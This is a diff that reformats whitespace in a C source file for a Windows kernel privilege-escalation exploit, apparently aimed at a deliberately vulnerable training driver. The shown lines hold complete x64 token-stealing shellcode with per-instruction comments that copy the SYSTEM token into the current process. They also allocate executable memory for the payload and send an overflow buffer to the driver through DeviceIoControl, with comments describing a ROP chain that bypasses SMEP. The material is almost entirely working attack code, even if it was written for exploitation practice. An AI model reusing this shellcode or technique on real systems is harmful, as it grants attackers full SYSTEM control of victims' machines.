@@ -97,26 +97,26 @@ int wmain(int argc, wchar_t* argv[])
 	ROP DisableSMEP, EnableSMEP;
 
 	CHAR ShellCode[] = 
-		"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"		// mov rdx, [gs:188h]		; Get _ETHREAD pointer from KPCR
-		"\x4C\x8B\x82\xB8\x00\x00\x00"				// mov r8, [rdx + b8h]		; _EPROCESS (kd> u PsGetCurrentProcess)
-		"\x4D\x8B\x88\xe8\x02\x00\x00"				// mov r9, [r8 + 2e8h]		; ActiveProcessLinks list head
-		"\x49\x8B\x09"								// mov rcx, [r9]			; Follow link to first process in list
+		"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"	// mov rdx, [gs:188h]		; Get _ETHREAD pointer from KPCR
+		"\x4C\x8B\x82\xB8\x00\x00\x00"		// mov r8, [rdx + b8h]		; _EPROCESS (kd> u PsGetCurrentProcess)
+		"\x4D\x8B\x88\xe8\x02\x00\x00"		// mov r9, [r8 + 2e8h]		; ActiveProcessLinks list head
+		"\x49\x8B\x09"				// mov rcx, [r9]		; Follow link to first process in list
 		//find_system_proc:
-		"\x48\x8B\x51\xF8"							// mov rdx, [rcx - 8]		; Offset from ActiveProcessLinks to UniqueProcessId
-		"\x48\x83\xFA\x04"							// cmp rdx, 4				; Process with ID 4 is System process
-		"\x74\x05"									// jz found_system			; Found SYSTEM token
-		"\x48\x8B\x09"								// mov rcx, [rcx]			; Follow _LIST_ENTRY Flink pointer
-		"\xEB\xF1"									// jmp find_system_proc		; Loop
+		"\x48\x8B\x51\xF8"			// mov rdx, [rcx - 8]		; Offset from ActiveProcessLinks to UniqueProcessId
+		"\x48\x83\xFA\x04"			// cmp rdx, 4			; Process with ID 4 is System process
+		"\x74\x05"				// jz found_system		; Found SYSTEM token
+		"\x48\x8B\x09"				// mov rcx, [rcx]		; Follow _LIST_ENTRY Flink pointer
+		"\xEB\xF1"				// jmp find_system_proc		; Loop
 		//found_system:
-		"\x48\x8B\x41\x70"							// mov rax, [rcx + 70h]		; Offset from ActiveProcessLinks to Token
-		"\x24\xF0"									// and al, 0f0h				; Clear low 4 bits of _EX_FAST_REF structure
-		"\x49\x89\x80\x58\x03\x00\x00"				// mov [r8 + 358h], rax		; Copy SYSTEM token to current process's token
+		"\x48\x8B\x41\x70"			// mov rax, [rcx + 70h]		; Offset from ActiveProcessLinks to Token
+		"\x24\xF0"				// and al, 0f0h			; Clear low 4 bits of _EX_FAST_REF structure
+		"\x49\x89\x80\x58\x03\x00\x00"		// mov [r8 + 358h], rax		; Copy SYSTEM token to current process's token
 		//recover:
-		"\x48\x83\xc4\x18"							// add rsp, 18h				; Set Stack Pointer to SMEP enable ROP chain
-		"\x48\x31\xF6"								// xor rsi, rsi				; Zeroing out rsi register to avoid Crash
-		"\x48\x31\xFF"								// xor rdi, rdi				; Zeroing out rdi register to avoid Crash
-		"\x48\x31\xC0"								// xor rax, rax				; NTSTATUS Status = STATUS_SUCCESS
-		"\xc3"										// ret						; Enable SMEP and Return to IrpDeviceIoCtlHandler+0xe2
+		"\x48\x83\xc4\x18"			// add rsp, 18h			; Set Stack Pointer to SMEP enable ROP chain
+		"\x48\x31\xF6"				// xor rsi, rsi			; Zeroing out rsi register to avoid Crash
+		"\x48\x31\xFF"				// xor rdi, rdi			; Zeroing out rdi register to avoid Crash
+		"\x48\x31\xC0"				// xor rax, rax			; NTSTATUS Status = STATUS_SUCCESS
+		"\xc3"					// ret				; Enable SMEP and Return to IrpDeviceIoCtlHandler+0xe2
 		;
 
 	wprintf(L"    __ __         __    ____       	\n");
@@ -153,8 +153,8 @@ int wmain(int argc, wchar_t* argv[])
 	wprintf(L" [*] Allocating Ring0 Payload");
 
 	lpvPayload = VirtualAlloc(
-		NULL,						// Next page to commit
-		sizeof(ShellCode),			// Page size, in bytes
+		NULL,				// Next page to commit
+		sizeof(ShellCode),		// Page size, in bytes
 		MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
 		PAGE_EXECUTE_READWRITE);	// Read/write access
 	if (lpvPayload == NULL)
@@ -170,13 +170,13 @@ int wmain(int argc, wchar_t* argv[])
 	wprintf(L" [+] Ring0 Payload available at: 0x%p \n", lpvPayload);
 	wprintf(L"\n [*] Trying to get a handle to the following Driver: %ls", lpDeviceName);
 
-	hDevice = CreateFile(lpDeviceName,					// Name of the write
-		GENERIC_READ | GENERIC_WRITE,					// Open for reading/writing
-		FILE_SHARE_WRITE,								// Allow Share
-		NULL,											// Default security
-		OPEN_EXISTING,									// Opens a file or device, only if it exists.
+	hDevice = CreateFile(lpDeviceName,			// Name of the write
+		GENERIC_READ | GENERIC_WRITE,			// Open for reading/writing
+		FILE_SHARE_WRITE,				// Allow Share
+		NULL,						// Default security
+		OPEN_EXISTING,					// Opens a file or device, only if it exists.
 		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,	// Normal file
-		NULL);											// No attr. template
+		NULL);						// No attr. template
 
 	if (hDevice == INVALID_HANDLE_VALUE)
 	{
@@ -214,14 +214,14 @@ int wmain(int argc, wchar_t* argv[])
 
 	wprintf(L" [*] Lets send some Bytes to our Driver, bypass SMEP and execute our Usermode Shellcode");
 
-	DWORD junk = 0;                     // Discard results
+	DWORD junk = 0;                     	// Discard results
 
 	bResult = DeviceIoControl(hDevice,	// Device to be queried
-		0x222003,						// Operation to perform
-		chBuffer, 2152,					// Input Buffer
-		NULL, 0,						// Output Buffer
-		&junk,							// # Bytes returned
-		(LPOVERLAPPED)NULL);			// Synchronous I/O	
+		0x222003,			// Operation to perform
+		chBuffer, 2152,			// Input Buffer
+		NULL, 0,			// Output Buffer
+		&junk,				// # Bytes returned
+		(LPOVERLAPPED)NULL);		// Synchronous I/O	
 	if (!bResult) {
 		wprintf(L" -> Failed to send Data!\n\n");
 		CloseHandle(hDevice);
